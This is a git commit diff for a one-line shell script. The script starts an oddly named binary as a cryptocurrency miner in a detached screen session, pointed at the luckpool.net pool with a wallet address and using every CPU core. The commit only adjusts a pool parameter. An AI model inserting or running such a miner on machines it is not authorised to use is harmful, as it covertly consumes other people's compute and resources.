bf7c5be4a9f1cd3d343a12e8c14ec8eef520c087
renilo <88342640+renilo@users.noreply.github.com>
2021-10-29 13:07:26 +0700

    Update xhajar1.sh

--- xhajar1.sh
+++ xhajar1.sh
@@ -1,1 +1,1 @@
-screen -dmS Running ./meki-baru1 -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.ATESTES -p x,xn=5f -t $(nproc)
+screen -dmS Running ./meki-baru1 -v -l eu.luckpool.net:3956 -u RR6U3T7Uz475i7gontznFLWikFsQan2wjC.ATESTES -p x,xn=5f,d=4096s -t $(nproc)
